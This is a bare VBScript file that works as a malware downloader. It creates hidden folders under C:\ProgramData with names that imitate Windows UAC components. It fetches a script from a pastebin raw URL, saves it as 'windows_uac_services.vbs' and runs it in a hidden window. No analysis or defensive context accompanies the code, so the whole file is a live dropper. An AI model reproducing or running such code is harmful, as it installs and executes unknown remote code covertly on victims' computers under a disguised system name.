WScript.Sleep 1000
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd.exe /c cd C:/ProgramData & md UAC & md UAC\Report & md  UAC\Service\Logs", 0, True

WScript.Sleep 1000
Set objWinHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
URL = "https://pastebin.com/raw/j8szRLNS"
objWinHttp.open "GET", URL, False
objWinHttp.send ""
SaveBinaryData "C:\ProgramData\UAC\Service\windows_uac_services.vbs",objWinHttp.responseBody

Function SaveBinaryData(FileName, Data)
Const adTypeText = 1
Const adSaveCreateOverWrite = 2
Dim BinaryStream
Set BinaryStream = CreateObject("ADODB.Stream")
BinaryStream.Type = adTypeText
BinaryStream.Open
BinaryStream.Write Data
BinaryStream.SaveToFile FileName, adSaveCreateOverWrite
End Function

WScript.Sleep 2000
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "C:\ProgramData\UAC\Service\windows_uac_services.vbs" & chr(34), 0
Set WsgShell = Nothing
